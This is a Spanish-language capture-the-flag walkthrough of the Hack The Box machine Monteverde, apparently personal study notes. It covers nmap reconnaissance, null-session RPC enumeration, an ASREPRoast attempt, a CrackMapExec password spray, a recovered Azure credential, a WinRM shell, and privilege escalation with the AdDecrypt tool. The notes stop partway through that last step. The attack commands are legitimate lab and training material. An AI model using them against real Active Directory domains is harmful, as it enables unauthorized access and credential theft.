----
- Tags:
-------
## Técnicas utilizadas
- RPC Enumeration  
- Credential Brute Force - CrackMapExec  
- Shell Over WinRM  
- Abusing Azure Admins Group - Obtaining the administrator's password (Privilege Escalation)
## Procedimiento

![[Pasted image 20230812031637.png]]

#### Reconocimiento
Si lanzamos un **nmap** sobre la maquina, nos encontramos los siguientes puertos abiertos:
```ruby
# nmap -sCV -p53,88,135,139,389,445,464,593,636,5985,9389,49667,49673,49674,49676,49697 -oN Ports 10.10.10.172
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-13 02:53 UTC
Nmap scan report for 10.10.10.172
Host is up (0.079s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-13 02:48:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -4m39s
| smb2-time: 
|   date: 2023-08-13T02:49:40
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.09 seconds
```

----------
#### RPC Enumeration  
Si intentamos conectanos al recuerso **RCP** haciendo uso de un **NULL SESSION** podemos empezar a enumerar usuarios y grupos:
```
# rpcclient -U '10.10.10.10' -N
```

**Enumerar usuarios del dominio**:
```
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

**Enumerar grupos del dominio**:
```
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]
```

**Enumerar la información de todos los usuarios**:
```
rpcclient $> querydispinfo
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)
```

Ahora que tenemos un listado potencial de usuarios, podemos intentar un **ASREPRoast attack**. Ejecutaremos el siguiente comando:
```ruby
# impacket-GetNPUsers.py MEGABANK.LOCAL/ -no-pass -userfile user.txt
```

--------------
#### Credential Brute Force - CrackMapExec  
Viendo que lo anterior no funciono dado que ningun usuario cuenta con el **UF_DONT_REQUIRE_PREAUTH**, podemos intentar un **Password Spray** con el mismo listado de usuarios pero intentando como contraseña el mismo listado de usuario. Esto lo haremos con **CrackMapExec** de la siguiente manera:
```
# crackmapexec smb 10.10.10.10 -u users.txt -p users.txt --continue-on-success
```

Y encontramos la siguiente credencial valida:
![[Pasted image 20230813030520.png]]

dentro de los recursos compartidos que podemos listar, vemos que hay uno de nombre **$users** el cual, dentro de alguna de sus carpetas hay unas credenciales para **Azure**:
```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

Con esta contraseña, podemos hacer **Password Spray** para ver a que usuario pertenece (de el listado que sacamos antes):
```
# crackmapexec smb 10.10.10.10 -u users.txt -p 'passwords' --continue-on-success
```

Y encontramos un usuario valido para esta contraseña:
![[Pasted image 20230813031123.png]]

------------------
#### Shell Over WinRM  
Con estas credenciales nos podemos conectar a través de **WinRM** con **Evil-WinRM** y estariamos en la maquina ya como el usuario **mhope**:
![[Pasted image 20230813031235.png]]

-----------
#### Abusing Azure Admins Group - Obtaining the administrator's password (Privilege Escalation)
Dentro de la maquina, como sabemos que existen un **Azure** podemos empezar a enumerarlo desde dentro. En el directorio **Program Files** existe una carpeta de nombre **Microsoft Azure AD Sync**, si buscamos en google por vulnerabilidades encontramos el siguiente [articulo](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/). Basicamente tenemos que descarganos este [ZIP](https://github.com/VbScrub/AdSyncDecrypt/releases/download/v1.0/AdDecrypt.zip), lo descomprimios y de lo resultante, tendriamos que subir a la maquina victima el **AdDecrypt.exe** y el **mcrypt.ddl**.

Buen, para que el exploit funcione, tenemos que estar en la siguiente ruta: `C:\Program Files\Microsoft Azure AD Sync\bin` y desde ahi ejecutar el siguiente comando `AdDecrypt.exe -FullSQL` 